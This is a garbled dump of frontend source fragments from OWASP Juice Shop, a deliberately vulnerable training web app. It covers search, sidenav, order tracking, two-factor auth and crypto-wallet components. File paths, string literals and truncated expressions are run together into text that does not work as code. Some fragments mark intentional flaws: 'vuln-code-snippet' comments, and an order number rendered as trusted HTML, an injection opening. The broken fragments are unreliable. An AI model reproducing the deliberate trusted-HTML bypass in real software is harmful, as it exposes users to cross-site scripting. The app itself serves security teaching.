rch('')product ... rch('')const q ... etAll()quantit ... etAll()forkJoi ... ducts])[quanti ... oducts]([quant ... \r\n    }dataTab ... [] = []TableEntry[]this.ta ... roductsthis.tr ... oducts)this.tr ... riptiontrustPr ... riptiondataTab ...      })dataTable.pushdeluxeP ... xePriceconst quantityconst e ...      })entry = ...      })dataTable.find(dataTa ...       }dataTab ... oductIddataTableEntry.idif (ent ...       }entry === undefinedentry.q ... uantityentry.quantityquantity.quantitythis.da ... aTable)new Mat ... aTable)i <= Ma ... h / 12)Math.ce ... h / 12)this.da ... th / 12this.dataSource.datalet i = 1i = 1this.pa ... i * 12)this.pa ... ns.pushthis.pageSizeOptionsi * 12this.pa ... Optionsthis.gr ... nnect()this.gridDataSourcethis.da ... nnect()this.da ... connectthis.resultsLengththis.filterTable()this.filterTablethis.ro ...      })this.ro ... riptionthis.router.eventsconst c ... allengethis.ro ... allengechallen ... uctor/)this.ro ... uctor/)this.ro ... ).matchthis.ro ... oin('')this.ro ... rl.jointhis.ro ... hot.urlthis.st ... lenge))this.st ... tructorstartHa ... tructordecodeU ... llenge)if (win ...       }window. ...  < 2600this.breakpoint = 4this.breakpointwindow. ...  < 1740this.breakpoint = 3window. ...  < 1280this.breakpoint = 2window. ... h < 850this.breakpoint = 1this.breakpoint = 6this.cd ... anges()this.cd ... Changesthis.cdReftrustPr ... ge\r\n  }i < tableData.lengthtableData.length{ // vu ... \r\n    }tableDa ... iption)tableDa ... riptiontableData[i]this.sa ... iption)this.ro ... cribe()filterT ...  }\r\n  }let que ... arams.qqueryPa ... arams.qthis.ro ... arams.qif (que ... \r\n    }queryPa ... .trim()queryParam.trim()queryParam.trim{ // vu ...       }this.io ... yParam)this.da ... rCase()this.da ... .filterqueryPa ... rCase()queryPa ... werCasethis.se ... yParam)this.searchValuethis.sa ... yParam)this.gr ...      })this.gr ... bscriberesult.length === 0result.lengththis.da ... er = ''startHa ... })\r\n  }console ... ame}"`)`Starti ... Name}"`Startin ... lenge "Starting instructions for challenge "import( ... \n    })import( ... uctor')../../hacking-instructormodule  ... \r\n    }module. ... geName)module. ... ctorForaddToBa ... })\r\n  }this.ba ... bid')))const p ... roductslet found = falsefound = falsei < pro ... .lengthproduct ... .lengthproduct ...  === idproduct ... t[i].idproductsInBasket[i]found = truethis.ba ... tem.id)product ... Item.idproduct ... ketItem(existi ...       }const n ... ity + 1newQuan ... ity + 1existin ... ity + 1existin ... uantityexistin ... Item.id(update ...       }this.pr ... ductId)updated ... oductIdthis.tr ... name }){ produ ... .name }product ... ct.name(basket ...       }if (!fo ...       }!foundthis.ba ... y: 1 })this.ba ... ce.save{ Produ ... ty: 1 }ProductId: idBasketI ... ('bid')(newBas ...       }newBask ... oductIdonResiz ...  }\r\n  }event.t ...  < 2600event.t ... erWidthevent.t ...  < 1740event.t ...  < 1280event.t ... h < 850P:/My Drive/Git/juice-shop/frontend/src/app/server-started-notification/server-started-notification.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/server-started-notificationautoRestoreMessagehacking ... MessagecloseNotification()clearedhacking ... clearedclearProgressclearProgress()!hackin ... clearedcontainer primary-notification mat-elevation-z4hackingProgress.autoRestoreMessage{{hackingProgress.autoRestoreMessage}}hackingProgress.cleared!hackingProgress.clearedmat-card-headerP:/My Drive/Git/juice-shop/frontend/src/app/server-started-notification/server-started-notification.component.spec.ts'./server-started-notification.component''ServerStartedNotificationComponent''should keep continue code cookie after successfully restoring progress on server start''on''server started''should set auto-restore success-message when progress restore succeeds''AUTO_RESTORED_PROGRESS''should translate AUTO_RESTORED_PROGRESS message''Translation of AUTO_RESTORED_PROGRESS''should log errors during automatic progress restore directly to browser console''should set auto-restore error-message when progress restore failed''AUTO_RESTORE_PROGRESS_FAILED''should translate AUTO_RESTORE_PROGRESS_FAILED message including the returned error''Translation of AUTO_RESTORE_PROGRESS_FAILED: error''do nothing if continueCode cookie is not present''should remove the restore message when closing the notification''should remove the continue code cookie when clearing the progress'./server-started-notification.component/server-started-notification'Server ... ponent'challen ... ress'])jasmine ... ress'])['restoreProgress']challen ... ess.andchallen ... rogress[Server ... ponent]cookieS ... eCode')'should ...  start'should keep continue code cookie after successfully restoring progress on server startspyOn(m ... , 'on')cookieS ... 'CODE')const c ... r(0)[1]callbac ... r(0)[1]mockSoc ... r(0)[1]mockSoc ... sFor(0)mockSoc ... argsFormockSocket.on.callsmockSocket.onexpect( ... arted')mockSoc ... r(0)[0]server startedexpect( ... 'CODE')expect( ... Code'))'should ... cceeds'should set auto-restore success-message when progress restore succeedstransla ... RESS'))of('AUT ... GRESS')'AUTO_R ... OGRESS'AUTO_RESTORED_PROGRESSexpect( ... essage)should translate AUTO_RESTORED_PROGRESS messageof('Tra ... GRESS')'Transl ... OGRESS'Translation of AUTO_RESTORED_PROGRESSexpect( ... GRESS')should log errors during automatic progress restore directly to browser consoleshould set auto-restore error-message when progress restore failedtransla ... ILED'))of('AUT ... AILED')'AUTO_R ... FAILED'AUTO_RESTORE_PROGRESS_FAILEDshould translate AUTO_RESTORE_PROGRESS_FAILED message including the returned errortransla ... rror'))of('Tra ... error')'Transl ...  error'Translation of AUTO_RESTORE_PROGRESS_FAILED: errorexpect( ... error')it('do  ... )\r\n  })'do not ... resent'do nothing if continueCode cookie is not presentshould remove the restore message when closing the notification'should ... ogress'should remove the continue code cookie when clearing the progressexpect( ... leared)compone ... clearedP:/My Drive/Git/juice-shop/frontend/src/app/server-started-notification/server-started-notification.component.tsHackingProgress'app-server-started-notification''./server-started-notification.component.html''./server-started-notification.component.scss'notificationServerStarted'displayedDifficulties''showSolvedChallenges''showDisabledChallenges''showOnlyTutorialChallenges''displayedChallengeCategories'autoRes ...  | nullcleared: boolean'app-se ... cation''./serv ... t.html'./server-started-notification.component.html['./ser ... .scss']'./serv ... t.scss'./server-started-notification.component.scsspublic  ... rogress{} as H ... rogressconst c ... eCode')continu ... eCode')const c ... indIt')continu ... indIt')const c ... FixIt')continu ... FixIt')(notifi ...       }notific ... Startedthis.ha ... Startedthis.ha ... Messagethis.hackingProgressthis.ha ... ationIdthis.tr ... rror })() => {\r\n          }{\r\n          }closeNo ... ll\r\n  }this.ha ...  = nullclearPr ... ue\r\n  }localSt ... lties')'displa ... ulties'displayedDifficultieslocalSt ... enges')'showSo ... lenges'showSolvedChallenges'showDi ... lenges''showOn ... lenges'showOnlyTutorialChallengeslocalSt ... ories')'displa ... gories'displayedChallengeCategoriesthis.ha ...  = truethis.ha ... clearedP:/My Drive/Git/juice-shop/frontend/src/app/sidenav/sidenav.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/sidenavonToggleSidenav();goToProfilePage();showOrdersSubmenushowOrd ... Submenu!showOrdersSubmenu{'rotated' : showOrdersSubmenu}{'expanded' : showOrdersSubmenu}showPrivacySubmenushowPri ... Submenu!showPrivacySubmenu{'rotated' : showPrivacySubmenu}{'expanded' : showPrivacySubmenu}scoreBo ... HubLinkofferScoreBoardTutorial!scoreB ... utorial!scoreBoardVisibleofferSc ... utorialstartHa ... uctor()icon-mongodbicon-database-alt2icon-nodejsicon-javascript-alticon-css3icon-sassicon-html5icon-angularfont-size: 12px;{{version}}font-size: 13px;mat-nav-listmat-list-item./redirect?to=https://github.com/juice-shop/juice-shopGo to OWASP Juice Shop GitHub pagemenu-text truncatematListIconfab fa-github fa-lg!scoreBoardVisible && offerScoreBoardTutorialstartHackingInstructor()Launch beginners tutorial{{"BTN_GETTING_STARTED" | translate}}"BTN_GETTING_STARTED""BTN_GE ... anslate"BTN_GE ... TARTED"BTN_GETTING_STARTEDOpen score-board{{"TITLE_SCORE_BOARD" | translate}}"TITLE_SCORE_BOARD"TITLE_SCORE_BOARDfas fa-trophy fa-lgscoreBoardVisible || showGitHubLinkmargin-bottom: 10px;Go to deluxe membership page{{"LABEL_DELUXE_MEMBERSHIP" | translate}}"LABEL_DELUXE_MEMBERSHIP""LABEL_ ... ERSHIP"LABEL_DELUXE_MEMBERSHIPGo to photo wallGo to about us page{{"TITLE_ABOUT" | translate}}"TITLE_ABOUT"TITLE_ABOUTmat-subheaderside-subHeaderGo to chatbot page/complainGo to complain page{{"NAV_COMPLAIN" | translate}}"NAV_COMPLAIN""NAV_CO ... anslateNAV_COMPLAINGo to contact us page{{"SECTION_CUSTOMER_FEEDBACK" | translate}}"SECTION_CUSTOMER_FEEDBACK""SECTIO ... EDBACK"SECTION_CUSTOMER_FEEDBACKonToggleSidenav(); logout()submenuonToggleSidenav(); showPrivacySubmenu = !showPrivacySubmenushowPrivacySubmenu = !showPrivacySubmenumenu-buttononToggleSidenav(); showOrdersSubmenu = !showOrdersSubmenushowOrdersSubmenu = !showOrdersSubmenu{{"ACCOUNTING" | translate }}onToggleSidenav(); goToProfilePage();{{ userEmail }}P:/My Drive/Git/juice-shop/frontend/src/app/sidenav/sidenav.component.spec.ts'./sidenav.component''SidenavComponent'administractionService'should show accounting functionality when user has according role''should set version number as retrieved with "v" prefix''should not show accounting functionality when user lacks according role''1.2.3''v1.2.3''should hide Score Board link when Score Board was not discovered yet''should show Score Board link when Score Board was already discovered'./sidenav.component/sidenav{ appli ... r: {} }applica ... r: {} }{ welco ... r: {} }welcomeBanner: {}hacking ... tor: {}adminis ... (null))loginGu ... lue({})[SidenavComponent]'should ... g role'should show accounting functionality when user has according roleloginGu ... ng } }){ data: ... ing } }data: { ... nting }{ role: ... nting }role: r ... ountingexpect( ... ting())compone ... nting()compone ... ounting'should ... prefix'should set version number as retrieved with "v" prefixshould not show accounting functionality when user lacks according roleadminis ... .2.3'))of('1.2.3')1.2.3expect( ... 1.2.3')v1.2.3v1should hide Score Board link when Score Board was not discovered yetof([{ n ... lse }])[{ name ... alse }]compone ... tatus()compone ... dStatus'should ... overed'should show Score Board link when Score Board was already discoveredof([{ n ... rue }])[{ name ... true }]P:/My Drive/Git/juice-shop/frontend/src/app/sidenav/sidenav.component.ts'sidenav''./sidenav.component.html''./sidenav.component.scss'isShowinggetApplicationDetails'Starting instructions for challenge "Score Board"'selector: 'sidenav''./side ... t.html'./sidenav.component.html['./sid ... .scss']'./side ... t.scss'./sidenav.component.scsspublic  ... il = ''constru ... rd) { }this.ge ... DetailsgetAppl ... DetailsgetAppl ... })\r\n  }config? ... Enabledconfig? ... stStartconfig? ... eBannerconfig. ... Enabledconfig. ... tructorthis.of ... Enabledthis.of ... utorialconfig. ... stStartconfig. ... eBannerpayload?.data?.rolethis.on ... denav()this.onToggleSidenavconsole ... oard"')'Starti ... Board"'Starting instructions for challenge "Score Board"module. ... Board')P:/My Drive/Git/juice-shop/frontend/src/app/token-sale/token-sale.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/token-sale'SECTION_ICO'juicycoin'SECTIO ... inName}SECTION_ICO{juicyc ... inName}juicyco ... oinName'ICO_FAQ_QUESTION''ICO_FA ... inName}ICO_FAQ_QUESTIONassets/public/images/padding/56px.png'ICO_FAQ_QUESTION' | translate:{juicycoin: altcoinName}fas fa-comments fa-2xfas fa-comment-alt fa-2x{{altcoinName}}fab fa-bitcoinfar fa-comments fa-2xfar fa-comment-alt fa-2xwhitepaper-container offer-containeroffer-boxwhitepaper-buttonshttps://www.sec.gov/investor/alerts/ia_virtualcurrencies.pdffas fa-graduation-cap fa-lghttps://ponzico.win/ponzico.pdffas fa-university fa-lg{{'SECTION_WHITEPAPER' | translate}}'SECTION_WHITEPAPER''SECTIO ... anslateSECTION_WHITEPAPERmat-card-subtitle'SECTION_ICO' | translate:{juicycoin: altcoinName}{{'TITLE_TOKENSALE' | translate}}'TITLE_TOKENSALE'TITLE_TOKENSALEP:/My Drive/Git/juice-shop/frontend/src/app/token-sale/token-sale.component.spec.ts'./token-sale.component''TokenSaleComponent''should set altcoinName as obtained from configuration''Coin'./token-sale.component/token-sale[TokenSaleComponent]should set altcoinName as obtained from configurationof({ ap ... n' } }){ appli ... in' } }applica ... Coin' }{ altco ... Coin' }altcoinName: 'Coin'Coinexpect( ... 'Coin')expect( ... inName)compone ... oinNameP:/My Drive/Git/juice-shop/frontend/src/app/token-sale/token-sale.component.tsfaBitcoinfaCommentAltfaGraduationCapfaUniversityfarCommentAltfarComments'app-token-sale''./token-sale.component.html''./token-sale.component.scss''Juicycoin'faComme ... mentAltfaComme ... ommentslibrary ... mments)selecto ... n-sale'app-token-sale'./toke ... t.html'./token-sale.component.html['./tok ... .scss']'./toke ... t.scss'./token-sale.component.scsspublic  ... cycoin'config? ... oinNamethis.al ... oinNamethis.altcoinNameconfig. ... oinNameP:/My Drive/Git/juice-shop/frontend/src/app/track-result/track-result.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/track-resultorderNoresults.orderNoNewstatus  ... tus.NewStatus.NewPackingstatus  ... PackingStatus.PackingTransitstatus  ... TransitStatus.TransitDeliveredstatus  ... liveredStatus.Delivered{'bonus': results.bonus}'BONUS_FOR_FUTURE_PURCHASES''BONUS_ ... anslate'BONUS_ ... CHASES'BONUS_FOR_FUTURE_PURCHASESbonus-container'BONUS_FOR_FUTURE_PURCHASES' | translateproduct-totallet product{{product.total}}product-quantity{{product.quantity}}{{product.price}}product-name{{product.name}}table-wrappertable-heading headingtext-align: center;container-fluid wellrow fa-4xfa-layers fa-fwstatus !== Status.Deliveredfa-layers-counter accent-notificationwidth: max-content{{results.eta}}results.eta{{'LABEL_DAYS' | translate}}'LABEL_DAYS'fas fa-homestatus === Status.Deliveredfas fa-home confirmationstatus !== Status.Transitstatus === Status.Transitfas fa-truck confirmationstatus !== Status.Packingfas fa-truck-loadingstatus === Status.Packingfas fa-truck-loading confirmationstatus !== Status.Newfas fa-warehousestatus === Status.Newfas fa-warehouse confirmationP:/My Drive/Git/juice-shop/frontend/src/app/track-result/track-result.component.spec.ts'./track-result.component''TrackResultComponent''should consider order number as trusted HTML''<a src="link">Link</a>''<code><a src="link">Link</a></code>''should set "delivered" status for delivered orders''should set "packing" status for undelivered orders with ETA over 2 days''should set "transit" status for undelivered orders with ETA under 3 days'./track-result.component'TrackR ... ponent'of({ data: [{ }] }){ data: [{ }] }data: [{ }][{ }][TrackR ... ponent]should consider order number as trusted HTMLcompone ... nk</a>'component.orderId'<a src ... nk</a>'<a src="link">Link</a>of({ da ... d }] }){ data: ... Id }] }data: [ ... erId }][{ orde ... erId }]{ order ... derId }expect( ... code>')'<code> ... /code>'<code><a src="link">Link</a></code>'should ... orders'should set "delivered" status for delivered orders() => { ... d)\r\n  }of({ da ... e }] }){ data: ... ue }] }data: [ ... true }][{ deli ... true }]{ delivered: true }expect( ... ivered)expect( ... status)component.status'should ... 2 days'should set "packing" status for undelivered orders with ETA over 2 days() => { ... g)\r\n  }of({ da ... 3 }] }){ data: ...  3 }] }data: [{ eta: 3 }][{ eta: 3 }]{ eta: 3 }eta: 3expect( ... acking)'should ... 3 days'should set "transit" status for undelivered orders with ETA under 3 daysof({ da ... 2 }] }){ data: ...  2 }] }data: [{ eta: 2 }][{ eta: 2 }]{ eta: 2 }eta: 2expect( ... ransit)P:/My Drive/Git/juice-shop/frontend/src/app/track-result/track-result.component.tsfaSyncfaTruckLoadingfaWarehouse'app-track-result''./track-result.component.html''./track-result.component.scss'`<code>${}</code>`library ... faHome)export  ... ered\r\n}enum St ... ered\r\n}app-track-result'./trac ... t.html'./track-result.component.html['./tra ... .scss']'./trac ... t.scss'./track-result.component.scsspublic  ... ource()new Mat ... ource()public  ... tus.Newpublic  ...  Statusthis.or ... rams.idthis.ro ... rams.id(result ... \r\n    }this.re ... code>`)this.results.orderNothis.resultsthis.sa ... code>`)`<code> ... /code>`<code>results ... orderId</code>this.re ... ].emailthis.results.emailresults ... ].emailthis.re ... alPricethis.re ... roductsthis.re ... a : '?'this.results.etaresults ... a : '?'results ... definedthis.re ... ].bonusthis.results.bonusresults ... liveredthis.st ... liveredthis.statusthis.ro ... ta.typethis.st ... tus.Newthis.results.eta > 2this.st ... Packingthis.st ... TransitP:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth/two-factor-auth.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/two-factor-authsetupStatussetupStatus === truetwoFactorDisableFormdisable()errored(errore ... .dirty)errored ... m.dirty!twoFac ... m.dirtytwoFact ... m.dirtytwoFact ... invalidsetupSt ... = falsetwoFactorSetupFormsetup()totpUrl'L'{{'INITIAL_CODE_PLACEHOLDER' | translate }}'INITIAL_CODE_PLACEHOLDER''INITIA ... anslate'INITIA ... HOLDER'INITIAL_CODE_PLACEHOLDER{{ 'INITIAL_TOKEN_TOOLTIP' | translate}}'INITIAL_TOKEN_TOOLTIP''INITIA ... OOLTIP'INITIAL_TOKEN_TOOLTIPsetupStatus === falsetwo-factor-auth-setupsetupTwoFactorAuthtwoFactorSetupForm.invalidButton to complete the two-factor configuration{{'BTN_SAVE' | translate}}'BTN_SAVE''BTN_SA ... anslateBTN_SAVE{{initToken.value?.length || 0}}initTokeninitTok ... th || 0initTok ... .lengthinitToken.valueThe token to be entered from the authenticator must have 6 digits.currentPasswordSetup!(errored && !twoFactorSetupForm.dirty)two-factor-qr-code2fa-setup-instructions2fa-setup-successfullytwo-factor-auth-disabledisableTwoFactorAuthtwoFactorDisableForm.invalidButton to remove the two-factor authentication{{'BTN_REMOVE' | translate}}'BTN_REMOVE'BTN_REMOVEcurrentPasswordDisable!(errored && !twoFactorDisableForm.dirty)two-factor-auth-disable-title2fa-setup-titleP:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth/two-factor-auth.component.spec.ts'./two-factor-auth.component''../Services/two-factor-auth-service''TwoFactorAuthComponent'twoFactorAuthService'TwoFactorAuthService''status''setup''disable''should set TOTP secret and URL if 2FA is not already set up''Test App''secret'updateStatus'otpauth://totp/Test%20App:email?secret=secret&issuer=Test%20App''should not set TOTP secret and URL if 2FA is already set up''should confirm successful setup of 2FA''passwordControl''initalTokenControl''should reset and mark form as errored when 2FA setup fails'markAsDirty'should confirm successfully disabling 2FA''should reset and mark form as errored when disabling 2FA fails'./two-factor-auth.component/two-factor-auth../Services/two-factor-auth-service/Services/two-factor-auth-service'TwoFac ... ponent'let two ... ce: anytwoFact ... ce: anytwoFact ... able'])jasmine ... able'])['statu ... sable'][TwoFac ... ponent]'should ... set up'should set TOTP secret and URL if 2FA is not already set upof({ ap ... p' } }){ appli ... pp' } }applica ...  App' }{ name: 'Test App' }name: 'Test App'Test ApptwoFact ... 45' }))twoFact ... rnValuetwoFact ... tus.andtwoFact ... .statusof({ se ... 345' }){ setup ... 2345' }email: 'email'secret: 'secret'setupToken: '12345'expect( ... Status)compone ... pStatusexpect( ... 20App')expect( ... otpUrl)component.totpUrl'otpaut ... %20App'otpauth://totp/Test%20App:email?secret=secret&issuer=Test%20Appotpauth://totp/Test%20App:emaisecret=secret&issuer=Test%20Appexpect( ... ecret')expect( ... Secret)component.totpSecretshould not set TOTP secret and URL if 2FA is already set upsetup: true'should ... of 2FA'should confirm successful setup of 2FAtwoFact ... of({}))twoFact ... tup.andtwoFact ... e.setupcompone ... ntrol')compone ... orm.getcompone ... tupForminitalTokenControlcomponent.setup()component.setupexpect( ... .setup)should reset and mark form as errored when 2FA setup failstwoFact ... ror')))throwEr ... rror'))new Error('Error')component.erroredcompone ... Dirty()compone ... AsDirtyexpect( ... rrored)'should ... ng 2FA'should confirm successfully disabling 2FAtwoFact ... ble.andtwoFact ... disablecompone ... bleFormcomponent.disable()component.disableexpect( ... sword')expect( ... isable)should reset and mark form as errored when disabling 2FA failsP:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth/two-factor-auth.component.tsfaUnlockAlt'app-two-factor-auth''./two-factor-auth.component.html''./two-factor-auth.component.scss''^[\\d]{6}$'encodedAppName`otpauth://totp/${}:${}?secret=${}&issuer=${'Failed to fetch 2fa status''CONFIRM_2FA_SETUP''CONFIRM_2FA_DISABLE'library ... faSave)selecto ... r-auth''app-tw ... r-auth'app-two-factor-auth'./two- ... t.html'./two-factor-auth.component.html['./two ... .scss']'./two- ... t.scss'./two-factor-auth.component.scsspublic data?: stringpasswor ... uired])initalT ... 6}$')])new Unt ... 6}$')])[Valida ... {6}$')]Validat ... ]{6}$')^[\d]{6}$^[\d]{6}private ... e Shop'this.updateStatus()this.updateStatusupdateS ... us\r\n  }const s ... tatus()status  ... tatus()this.tw ... tatus()this.tw ... .statusthis.tw ... Serviceconst c ... ation()config  ... ation()forkJoi ... onfig])[status, config]([{ set ... \r\n    }[{ setu ... config]{ setup ... Token }this.se ... = setupthis.setupStatusthis.appNameif (!se ...       }!setupconst e ... ppName)encoded ... ppName)encodeU ... ppName)this.to ... pName}`this.totpUrl`otpaut ... pName}`otpauth://totp/?secret=&issuer=this.to ...  secretthis.totpSecretthis.se ... upTokenthis.setupTokenconsole ... tatus')'Failed ... status'Failed to fetch 2fa statusreturn statussetup ( ... })\r\n  }this.tw ... \n    })this.tw ... bscribethis.tw ... \r\n    )this.tw ... e.setupthis.tw ... ?.valuethis.tw ... ntrol')this.tw ... orm.getthis.tw ... tupFormthis.se ...  = truethis.sn ... SETUP')CONFIRM_2FA_SETUPthis.tw ... stine()this.tw ... ristinethis.errored = truethis.erroreddisable ... })\r\n  }this.tw ... disablethis.tw ... bleFormthis.up ...       )this.up ... bscribethis.se ... = falsethis.sn ... SABLE')'CONFIR ... ISABLE'CONFIRM_2FA_DISABLEP:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth-enter/two-factor-auth-enter.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth-enterverify()twoFactorForm{{ '2FA_ENTER_CODE_PLACEHOLDER' | translate}}'2FA_ENTER_CODE_PLACEHOLDER''2FA_EN ... anslate'2FA_EN ... HOLDER'2FA_ENTER_CODE_PLACEHOLDERtwoFactorForm.invalidtotpSubmitButtonButton to confirm the inputinputToken{{tokenInput.value?.length || 0}}tokenInputtokenIn ... th || 0tokenIn ... .lengthtokenInput.valueThe code to be entered from the authenticator must have 6 digits.P:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth-enter/two-factor-auth-enter.component.spec.ts FIXME Spy call is not registered at all// FIXM ...  at all'./two-factor-auth-enter.component''TwoFactorAuthEnterComponent''verify''should store authentication token in cookie''should store authentication token in local storage''should store basket ID in session storage''should notify about user login after 2FA verification'./two-factor-auth-enter.component/two-factor-auth-entertwoFact ... rify'])jasmine ... rify'])['verify']twoFact ... f({ }))twoFact ... ify.andtwoFact ... .verify'should ... cookie'should store authentication token in cookietwoFact ... EN' }))of({ to ... KEN' }){ token: 'TOKEN' }token: 'TOKEN'component.verify()component.verifyexpect( ... TOKEN')cookieS ... token')should store authentication token in local storageshould store basket ID in session storagetwoFact ...  42 }))of({ bid: 42 }){ bid: 42 }bid: 42expect( ... e('42')should notify about user login after 2FA verification{ // FI ... e)\r\n  }expect( ... h(true)P:/My Drive/Git/juice-shop/frontend/src/app/two-factor-auth-enter/two-factor-auth-enter.component.ts Use userService to notifiy if user has logged in /* Use  ... d in */ this.userService.isLoggedIn = true; /* this ... rue; */TokenEnterFormFields'app-two-factor-auth-enter''./two-factor-auth-enter.component.html''./two-factor-auth-enter.component.scss'fieldslibrary ... ockAlt)selecto ... -enter''app-tw ... -enter'app-two-factor-auth-enter./two-factor-auth-enter.component.html./two-factor-auth-enter.component.scsstoken:  ... 6}$')])Validat ... ngth(6)verify  ... })\r\n  }const f ... m.valuefields: ... m.valuethis.tw ... m.valuethis.twoFactorFormthis.tw ... .token)this.tw ... .verifyfields.tokenauthent ... tring()authent ... oStringsetTime ... * 1000)this.errored = false5 * 1000return errorP:/My Drive/Git/juice-shop/frontend/src/app/user-details/user-details.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/user-details{{user?.updatedAt}}updatedAtuser?.updatedAtLABEL_UPDATED_AT{{user?.createdAt}}createdAtuser?.createdAtLABEL_CREATED_AT<!--<div>
        <strong translate="LABEL_PASSWORD"></strong>
        <p>{{user?.password}}</p>
      </div>-->{{user?.email}}LABEL_EMAIL{{user?.id}}user?.idP:/My Drive/Git/juice-shop/frontend/src/app/user-details/user-details.component.spec.ts'./user-details.component''UserDetailsComponent''should log the error on retrieving user''should set the retrieved user''User'./user-details.component/user-details'UserDe ... ponent'userSer ... 'get'])userService.get.anduserService.get[UserDe ... ponent]should log the error on retrieving user'should ... d user'should set the retrieved useruserSer ... User'))of('User')expect( ... 'User')expect( ... t.user)component.userP:/My Drive/Git/juice-shop/frontend/src/app/user-details/user-details.component.ts'app-user-details''./user-details.component.html''./user-details.component.scss'app-user-details'./user ... t.html'./user-details.component.html['./use ... .scss']'./user ... t.scss'./user-details.component.scssthis.userService.get(user)  ... \r\n    }this.user = userP:/My Drive/Git/juice-shop/frontend/src/app/wallet/wallet.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/walletbalanceControlbalance ... equiredbalance ... invalidbalance ... .errorsbalance ... rs.max)(balanc ... rs.max)balance ... ors.maxbalance ... ors.mincontinue()balanceControl.invalidButton to continue to payment{{'BTN_DEPOSIT' | translate}}'BTN_DEPOSIT''BTN_DE ... anslateBTN_DEPOSITbalanceControl.invalid && (balanceControl.errors.min || balanceControl.errors.max)balanceControl.invalid && balanceControl.errors.requiredEnter an amount{{'LABEL_AMOUNT' | translate}}'LABEL_AMOUNT'LABEL_AMOUNT{{ balance }}header_container/#/wallet-web3P:/My Drive/Git/juice-shop/frontend/src/app/wallet/wallet.component.spec.ts'./wallet.component''WalletComponent''should be compulsory to provide amount''amount should be in the range [10, 1000]''should hold balance returned by backend API''100.00''should log error while getting balance from backend API directly to browser console'./wallet.componentlet walletService[WalletComponent]'should ... amount'should be compulsory to provide amountit('amo ... )\r\n  })'amount ...  1000]'amount should be in the range [10, 1000]amount should be in the range [10, 1000]compone ... lue(-1)compone ... lue(10)compone ... e(1000)should hold balance returned by backend APIwalletS ... f(100))of(100)expect( ... 00.00')expect( ... alance)component.balance100.0000should log error while getting balance from backend API directly to browser consolewalletS ... rror'))P:/My Drive/Git/juice-shop/frontend/src/app/wallet/wallet.component.ts'app-wallet''./wallet.component.html''./wallet.component.scss'selecto ... wallet'app-wallet'./wall ... t.html'./wallet.component.html['./wal ... .scss']'./wall ... t.scss'./wallet.component.scssthis.wa ... \n    })this.ba ... ixed(2)this.balancesession ... .value)this.ba ... l.valuethis.balanceControl['/paym ... allet']P:/My Drive/Git/juice-shop/frontend/src/app/wallet-web3/wallet-web3.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/wallet-web3'ENTER_ETHER_AMOUNT'ENTER_ETHER_AMOUNTinputAmountdepositETHdepositETH()withdrawETHwithdrawETH()dwbutton_containerdeposit_withdraw_buttonwarningButton to withdraw{{'BTN_WITHDRAW' | translate}}'BTN_WITHDRAW''BTN_WI ... anslateBTN_WITHDRAWButton to deposit{{ walletBalance }}{{
            userData.address.slice(-6)
          }}{{"BTN_CONNECT_METAMASK" | translate}}"BTN_CONNECT_METAMASK""BTN_CO ... anslate"BTN_CO ... TAMASK"BTN_CONNECT_METAMASK{{"TITLE_CRYPTO_WALLET" | translate}}"TITLE_CRYPTO_WALLET""TITLE_ ... WALLET"TITLE_CRYPTO_WALLETP:/My Drive/Git/juice-shop/frontend/src/app/wallet-web3/wallet-web3.component.tsBankAddress'0x413744D59d31AFDC2889aeE602636177805Bd7b0''app-wallet-web3''./wallet-web3.component.html''./wallet-web3.component.scss'WalletWeb3ComponentdepositAmountparseEthertxConfirmationgetUserEthBalancewithdrawalAmountuserBalanceformattedBalanceconst B ... 5Bd7b0'BankAdd ... 5Bd7b0''0x4137 ... 5Bd7b0'0x413744D59d31AFDC2889aeE602636177805Bd7b0selecto ... t-web3'app-wallet-web3./wallet-web3.component.html/wallet-web3./wallet-web3.component.scsswalletBalance = '0'inputAm ...  = nullasync d ...  }\r\n  }const d ... tring()deposit ... tring()this.in ... tring()this.in ... oStringthis.inputAmounttransac ...      })await c ...      })contrac ...      })contract.ethdepositvalue:  ... Amount)ethers. ... Amount)ethers. ... seEtherconst t ... .wait()txConfi ... .wait()this.ge ... lance()this.ge ... Balanceasync w ...  }\r\n  }const w ... tring()withdra ... tring()transac ...       )await c ...       )async g ...  }\r\n  }const u ... ddress)userBal ... ddress)const f ... alance)formatt ... alance)ethers. ... alance)this.wa ... Balancethis.ke ... essSendP:/My Drive/Git/juice-shop/frontend/src/app/wallet-web3/wallet-web3.module.ts'./wallet-web3.component'./wallet-web3.component[Wallet ... ponent]P:/My Drive/Git/juice-shop/frontend/src/app/web3-sandbox/web3-sandbox.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/web3-sandboxeditorOptionsselectedCompilerVersionselecte ... VersioncompilerVersionscompileAndFetchContractscompile ... s(code)compile ... ntractscompilerErrorscompile ... gth > 0compile ... .lengthcompiledContractsselectedContractNamecontractNamescontractName'GWEI_VALUE_FOR_SENDING_ETH''GWEI_V ... anslate'GWEI_V ... NG_ETH'GWEI_VALUE_FOR_SENDING_ETHcommonGweiValuedeploySelectedContractdeployS ... tract()deployS ... ontractcontractFunctionsfunc.inputs.length > 0; else noInputsinvokeFunctioninvokeFunction(func){{ func.inputHints }}inputHintsfunc.inputHintsinputValuesfunc.inputValuesoutputValuefunc.ou ...  !== ''func.outputValueinvokeOutputinvokeOutput !== ''sandbox-container mat-elevation-z6assets/public/images/padding/11px.pngsandbox-container_bodysandbox-container_body_rightinvokecontainer mat-elevation-z6output-container mat-elevation-z6{{ "LABEL_OUTPUT" | translate}}"LABEL_OUTPUT"LABEL_OUTPUT{{ invokeOutput }}let func of contractFunctionsfunction-containerinvoke-outputfunc.outputValue !== ''{{ "LABEL_OUTPUT_FOR" | translate }}"LABEL_OUTPUT_FOR"LABEL_OUTPUT_FOR{{ func.name }}func.name{{ func.outputValue }}{{ "BTN_INVOKE" | 